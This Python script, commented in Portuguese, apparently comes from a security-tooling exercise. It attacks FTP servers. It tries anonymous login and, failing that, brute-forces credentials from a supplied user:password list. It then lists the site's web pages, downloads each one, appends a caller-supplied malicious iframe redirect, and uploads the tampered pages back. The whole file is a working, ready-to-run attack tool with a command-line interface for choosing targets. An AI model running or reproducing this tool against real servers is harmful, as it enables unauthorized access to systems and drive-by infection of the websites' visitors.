#!/usr/bin/python
# -*- coding: utf-8 -*-

import ftplib
import optparse
import time


def anonLogin(hostname):
    """ Funcao para conexao via FTP anonimo """
    try:
        # Cria um objeto de ftp para conexao
        ftp = ftplib.FTP(hostname)
        # Tenta logar via ftp anonimo
        ftp.login('anonymous', 'me@your.com')
        print('\n[*] %s FTP Anonymous Logon Succeeded.' % (str(hostname)))
        # Fecha a conexao via ftp
        ftp.quit()
        return True
    except:
        # Se nao conseguir logar, retorna o erro
        print('\n[-] %s FTP Anonymous Logon Failed.' % (str(hostname)))
    return False


def bruteLogin(hostname, passwdFile):
    """ Funcao para tentativa de conexao  """

    # Abre o arquivo de usuarios e senhas
    pF = open(passwdFile, 'r')
    # Loopa todas as linhas do arquivo de usuarios e senhas
    for line in pF.readlines():
        # Aguarda 1 segundo
        time.sleep(1)
        # Separa o usuario da senha, separados por :
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')

        print("[+] Trying: %s/%s" % (userName, passWord))
        try:
            # Cria um objeto de ftp para conexao
            ftp = ftplib.FTP(hostname)
            # Tenta logar via ftp usando os parametros informados
            ftp.login(userName, passWord)
            print('\n[*] %s FTP Logon Succeeded: %s/%s' % (str(hostname), userName, passWord))
            # Fecha a conexao via FTP
            ftp.quit()
            return (userName, passWord)
        except:
            pass
    # Se nao conseguiu conexao retorna erro
    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)


def returnDefault(ftp):
    """ Funcao de procura de paginas padroes """

    try:
        # Lista todos os arquivos de um diretorio
        dirList = ftp.nlst()
    except:
        # Se nao conseguir listar os arquivos retorna erro
        dirList = []
        print('[-] Could not list directory contents.')
        print('[-] Skipping To Next Target.')
        return

    # Variavel para armazenar o retorno
    retList = []
    # Loopa todos os arquivos encontrados no diretorio padrao do host alvo
    for fileName in dirList:
        # Transforma o nome do arquivo em minusculo
        fn = fileName.lower()
        # Verifica se no nome do arquivo existe .php, .htm, .html ou .asp
        if '.php' in fn or '.htm' in fn or '.html' in fn or '.asp' in fn:
            print('[+] Found default page: %s' % (fileName))
            # Se encontrar arquivos com essa extensao, armazena para o retorno
            retList.append(fileName)
    return retList


def injectPage(ftp, page, redirect):
    """ Funcao para inserir um arquivo html com codigos maliciosos """

    # Abre o arquivo temporario
    f = open('%s.tmp' % (page), 'w')
    # Faz o download do arquivo html do host alvo
    ftp.retrlines('RETR %s' % page, f.write)
    print('[+] Downloaded Page: %s' % (page))

    # Escreve o iframe no arquivo temporario
    f.write(redirect)
    # Fecha o arquivo temporario
    f.close()
    print('[+] Injected Malicious IFrame on: %s' % (page))

    # Faz o upload do arquivo temporario com o redirect, renomeando para o arquivo principal
    ftp.storlines('STOR %s' % (page), open('%s.tmp' % (page), 'rb'))
    print('[+] Uploaded Injected Page: %s' % (page))


def attack(username, password, tgtHost, redirect):
    """ Funcao para inserir um arquivo com codigos maliciosos """

    # Cria um objeto de ftp para conexao
    ftp = ftplib.FTP(tgtHost)
    # Loga via ftp usando os parametros informados
    ftp.login(username, password)
    # Chama a funcao de procura de arquivos
    defPages = returnDefault(ftp)
    # Loopa todos os arqivos encontrados
    for defPage in defPages:
        injectPage(ftp, defPage, redirect)


def main():
    """ Funcao principal """

    # Parse explicando como deve ser a chamada do script
    parser = optparse.OptionParser('usage %prog -H <target host[s]> -r <redirect page>[-f <userpass file>]')

    # Separa os parametros solicitados
    parser.add_option('-H', dest='tgtHosts', type='string', help='specify target host')
    parser.add_option('-f', dest='passwdFile', type='string', help='specify user/password file')
    parser.add_option('-r', dest='redirect', type='string', help='specify a redirection page')

    # Faz o parse dos parametros
    (options, args) = parser.parse_args()

    # Se nao receber os parametros solicitados para o script
    if not options.tgtHosts or not options.redirect:
        print(parser.usage)
        exit(0)

    # Separa os parametros em variaveis
    tgtHosts = options.tgtHosts.replace(" ", '').split(',')
    passwdFile = options.passwdFile
    redirect = options.redirect

    # Loopa todos os host enviados por parametro
    for tgtHost in filter(None, tgtHosts):
        username = None
        password = None

        # Tenta se logar de forma anonima no FTP
        if anonLogin(tgtHost):
            # Usa o login anonimo padrao
            username = 'anonymous'
            password = 'me@your.com'
            print('[+] Using Anonymous Creds to attack')
            # Se conseguiu acesso anonimo, chama a funcao para tentar
            attack(username, password, tgtHost, redirect)

        # Se informou um arquivo de senha via parametro
        elif passwdFile:
            # Chama a funcao de forcar o login para tentar acesso
            (username, password) = bruteLogin(tgtHost, passwdFile)
            if password:
                print('[+] Using Creds: %s/%s to attack' % (username, password))
                attack(username, password, tgtHost, redirect)

# Chama a funcao main principal
if __name__ == '__main__':
    main()
